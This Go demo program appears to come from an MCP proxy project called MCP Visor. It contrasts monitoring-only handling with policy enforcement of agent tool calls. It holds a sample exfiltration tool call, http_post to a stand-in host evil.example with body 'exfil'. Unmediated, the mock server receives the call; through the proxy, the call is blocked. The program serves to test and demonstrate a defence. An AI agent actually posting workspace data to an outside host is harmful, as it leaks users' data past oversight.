// Command monitor-vs-proof shows why delayed detection is not authorization.
// The same http_post to https://evil.example/exfil is the scenario input.
// Unmediated, the mock MCP server observes the call (an effect that a later
// alert cannot un-send). Through Visor with allow_destination, the call is
// denied at intercept with MANDATE->EGRESS evidence and the server never
// sees it. Mandated docs.internal still forwards. This is H25, not a
// Pre-Effect Authority Proof, Astra clock, or new engine rule.
package main

import (
	"bufio"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	logicalServer   = "workspace"
	scenarioURL     = "https://evil.example/exfil"
	mandateURL      = "https://docs.internal/api"
	unmediatedCall  = 300
	mediatedRead    = 100
	mediatedMandate = 200
	mediatedDeny    = 300
)

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "FAIL: %v\n", err)
		os.Exit(1)
	}
}

func run() error {
	repoRoot, err := findRepoRoot()
	if err != nil {
		return err
	}

	dir := os.TempDir()
	pid := os.Getpid()
	mockBin := filepath.Join(dir, fmt.Sprintf("mvp-mock-%d", pid))
	visorBin := filepath.Join(dir, fmt.Sprintf("mvp-visor-%d", pid))
	policyPath := filepath.Join(dir, fmt.Sprintf("mvp-policy-%d.yaml", pid))
	auditPath := filepath.Join(dir, fmt.Sprintf("mvp-audit-%d.jsonl", pid))
	unmedObs := filepath.Join(dir, fmt.Sprintf("mvp-unmed-obs-%d.jsonl", pid))
	medObs := filepath.Join(dir, fmt.Sprintf("mvp-med-obs-%d.jsonl", pid))

	defer os.Remove(mockBin)
	defer os.Remove(visorBin)
	defer os.Remove(policyPath)
	defer os.Remove(auditPath)
	defer os.Remove(unmedObs)
	defer os.Remove(medObs)

	if out, e := exec.Command("go", "build", "-o", mockBin, filepath.Join(repoRoot, "examples", "demo-mcp-server")).CombinedOutput(); e != nil {
		return fmt.Errorf("build mock server: %w\n%s", e, out)
	}
	if out, e := exec.Command("go", "build", "-o", visorBin, filepath.Join(repoRoot, "cmd", "mcp-visor")).CombinedOutput(); e != nil {
		return fmt.Errorf("build visor: %w\n%s", e, out)
	}
	if err := os.WriteFile(policyPath, []byte(monitorVsProofPolicy()), 0o600); err != nil {
		return fmt.Errorf("write policy: %w", err)
	}

	fmt.Println("MCP Visor")
	fmt.Println("Detection is not authorization.")
	fmt.Println()
	fmt.Println("SCENARIO")
	fmt.Printf("http_post %s\n", scenarioURL)
	fmt.Println()

	if err := runUnmediated(mockBin, unmedObs); err != nil {
		return err
	}
	if err := runMediated(visorBin, mockBin, policyPath, auditPath, medObs); err != nil {
		return err
	}

	fmt.Println("Enforcement is universal; capability determines scrutiny, never whether enforcement exists.")
	fmt.Println("Model proposed.")
	fmt.Println("Policy authorized.")
	fmt.Println("Proxy enforced.")
	return nil
}

func runUnmediated(mockBin, observePath string) error {
	cmd := exec.Command(mockBin, "-observe-log", observePath)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return fmt.Errorf("unmediated stdin: %w", err)
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return fmt.Errorf("unmediated stdout: %w", err)
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return fmt.Errorf("unmediated stderr: %w", err)
	}
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("start unmediated server: %w", err)
	}
	defer killProc(cmd)
	go drain(stderr)

	client := newClient(stdin, stdout)
	if err := client.initialize(); err != nil {
		return fmt.Errorf("unmediated initialize: %w", err)
	}
	resp, err := client.callTool(unmediatedCall, "http_post", map[string]any{
		"url":  scenarioURL,
		"body": "exfil",
	})
	if err != nil {
		return fmt.Errorf("unmediated http_post: %w", err)
	}
	if _, isErr := responseError(resp); isErr {
		return fmt.Errorf("unmediated http_post must reach the server, got %v", resp)
	}

	ids, err := observedRequests(observePath)
	if err != nil {
		return fmt.Errorf("unmediated observations: %w", err)
	}
	if !containsRequest(ids, unmediatedCall) {
		return errors.New("unmediated server must observe http_post")
	}

	fmt.Println("A  UNMEDIATED (monitoring-only)")
	fmt.Printf("   input  http_post %s\n", scenarioURL)
	fmt.Println("   t+0    SERVER OBSERVED  yes")
	fmt.Println("   later  a detector might alert (cannot un-send)")
	fmt.Println()
	return nil
}

func runMediated(visorBin, mockBin, policyPath, auditPath, observePath string) error {
	cmd := exec.Command(visorBin, "serve",
		"-server", mockBin,
		"-server-name", logicalServer,
		"-server-arg", "-observe-log",
		"-server-arg", observePath,
		"-policy", policyPath,
		"-audit-log", auditPath,
	)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return fmt.Errorf("visor stdin: %w", err)
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return fmt.Errorf("visor stdout: %w", err)
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return fmt.Errorf("visor stderr: %w", err)
	}
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("start visor: %w", err)
	}
	defer killProc(cmd)
	go drain(stderr)

	client := newClient(stdin, stdout)
	if err := client.initialize(); err != nil {
		return fmt.Errorf("mediated initialize: %w", err)
	}

	resp, err := client.callTool(mediatedRead, "file_read", map[string]any{
		"path": "/workspace/tickets.md",
	})
	if err != nil {
		return fmt.Errorf("mediated file_read: %w", err)
	}
	if _, isErr := responseError(resp); isErr {
		return fmt.Errorf("legitimate local read must allow, got %v", resp)
	}

	resp, err = client.callTool(mediatedMandate, "http_post", map[string]any{
		"url": mandateURL,
	})
	if err != nil {
		return fmt.Errorf("mediated mandated post: %w", err)
	}
	if _, isErr := responseError(resp); isErr {
		return fmt.Errorf("mandated host must allow, got %v", resp)
	}

	resp, err = client.callTool(mediatedDeny, "http_post", map[string]any{
		"url":  scenarioURL,
		"body": "exfil",
	})
	if err != nil {
		return fmt.Errorf("mediated deny post: %w", err)
	}
	msg, isErr := responseError(resp)
	if !isErr {
		return errors.New("authority-expanding destination must deny")
	}
	for _, token := range []string{
		"authority-expanding destination",
		"argument class URL",
		"effect class NETWORK",
	} {
		if !strings.Contains(msg, token) {
			return fmt.Errorf("deny missing evidence %q: %s", token, msg)
		}
	}

	ids, err := observedRequests(observePath)
	if err != nil {
		return fmt.Errorf("mediated observations: %w", err)
	}
	if !containsRequest(ids, mediatedRead) {
		return errors.New("mediated server must observe file_read")
	}
	if !containsRequest(ids, mediatedMandate) {
		return errors.New("mediated server must observe mandated http_post")
	}
	if containsRequest(ids, mediatedDeny) {
		return errors.New("mediated server must not observe denied http_post")
	}

	denied, err := findDecisionEvent(auditPath, "tool_call_denied")
	if err != nil {
		return err
	}
	reason, _ := denied["reason"].(string)
	decision, _ := denied["policy_decision"].(string)
	if decision != "deny" {
		return fmt.Errorf("audit decision want deny, got %q", decision)
	}
	if !strings.Contains(reason, "authority transition MANDATE->EGRESS") {
		return fmt.Errorf("audit missing MANDATE->EGRESS: %s", reason)
	}

	fmt.Println("B  VISOR + allow_destination")
	fmt.Printf("   input  http_post %s\n", scenarioURL)
	fmt.Println("   t+0    DENY  authority-expanding destination")
	fmt.Println("          argument class URL  effect class NETWORK  MANDATE->EGRESS")
	fmt.Println("   t+0    SERVER OBSERVED  no")
	fmt.Println()
	return nil
}

func monitorVsProofPolicy() string {
	return `version: "1.0"
description: >
  Monitor-vs-proof fixture. Server-level allowed_destinations is inert.
  Attaching allow_destination is the effect bound.
default_action: deny
servers:
  - name: "workspace"
    allowed: true
    allowed_destinations:
      - "evil.example"
    tools:
      - name: "file_read"
        allowed: true
        risk: low
      - name: "http_post"
        allowed: true
        risk: high
        rules:
          - type: allow_destination
            patterns:
              - "docs.internal"
`
}

func findRepoRoot() (string, error) {
	wd, err := os.Getwd()
	if err != nil {
		return "", err
	}
	for {
		if _, e := os.Stat(filepath.Join(wd, "go.mod")); e == nil {
			return wd, nil
		}
		parent := filepath.Dir(wd)
		if parent == wd {
			return "", errors.New("cannot find repo root (go.mod)")
		}
		wd = parent
	}
}

func killProc(cmd *exec.Cmd) {
	if cmd != nil && cmd.Process != nil {
		_ = cmd.Process.Kill()
		_, _ = cmd.Process.Wait()
	}
}

func drain(r io.Reader) {
	scanner := bufio.NewScanner(r)
	for scanner.Scan() { /* suppress */
	}
}

type mcpClient struct {
	w *bufio.Writer
	r *bufio.Reader
}

func newClient(stdin io.WriteCloser, stdout io.ReadCloser) *mcpClient {
	return &mcpClient{w: bufio.NewWriter(stdin), r: bufio.NewReader(stdout)}
}

func (c *mcpClient) send(msg map[string]any) error {
	data, err := json.Marshal(msg)
	if err != nil {
		return err
	}
	if _, err := c.w.Write(append(data, '\n')); err != nil {
		return err
	}
	return c.w.Flush()
}

func (c *mcpClient) recv() (map[string]any, error) {
	line, err := c.r.ReadBytes('\n')
	if err != nil {
		return nil, err
	}
	var msg map[string]any
	if err := json.Unmarshal(line, &msg); err != nil {
		return nil, err
	}
	return msg, nil
}

func (c *mcpClient) initialize() error {
	if err := c.send(map[string]any{
		"jsonrpc": "2.0", "id": 1, "method": "initialize",
		"params": map[string]any{
			"protocolVersion": "2024-11-05",
			"capabilities":    map[string]any{},
			"clientInfo":      map[string]any{"name": "monitor-vs-proof-agent", "version": "1.0"},
		},
	}); err != nil {
		return err
	}
	if _, err := c.recv(); err != nil {
		return err
	}
	if err := c.send(map[string]any{"jsonrpc": "2.0", "method": "notifications/initialized"}); err != nil {
		return err
	}
	time.Sleep(100 * time.Millisecond)
	return nil
}

func (c *mcpClient) callTool(id int, name string, args map[string]any) (map[string]any, error) {
	if err := c.send(map[string]any{
		"jsonrpc": "2.0", "id": id, "method": "tools/call",
		"params": map[string]any{"name": name, "arguments": args},
	}); err != nil {
		return nil, err
	}
	return c.recv()
}

func responseError(resp map[string]any) (string, bool) {
	raw, ok := resp["error"]
	if !ok || raw == nil {
		return "", false
	}
	if errObj, ok := raw.(map[string]any); ok {
		if msg, ok := errObj["message"].(string); ok {
			return msg, true
		}
	}
	return fmt.Sprintf("%v", raw), true
}

func observedRequests(path string) ([]int, error) {
	data, err := os.ReadFile(path)
	if err != nil && !os.IsNotExist(err) {
		return nil, err
	}
	var ids []int
	for _, line := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		if strings.TrimSpace(line) == "" {
			continue
		}
		var m map[string]any
		if err := json.Unmarshal([]byte(line), &m); err != nil {
			return nil, fmt.Errorf("malformed observation: %w", err)
		}
		if received, _ := m["received"].(bool); received {
			if id, ok := m["request_id"].(float64); ok {
				ids = append(ids, int(id))
			}
		}
	}
	return ids, nil
}

func containsRequest(ids []int, want int) bool {
	for _, id := range ids {
		if id == want {
			return true
		}
	}
	return false
}

func findDecisionEvent(auditPath, eventType string) (map[string]any, error) {
	data, err := os.ReadFile(auditPath)
	if err != nil {
		return nil, err
	}
	for _, line := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		if strings.TrimSpace(line) == "" {
			continue
		}
		var ev map[string]any
		if err := json.Unmarshal([]byte(line), &ev); err != nil {
			return nil, fmt.Errorf("malformed audit event: %w", err)
		}
		if ev["event_type"] == eventType {
			return ev, nil
		}
	}
	return nil, fmt.Errorf("no %s event found in %s", eventType, auditPath)
}
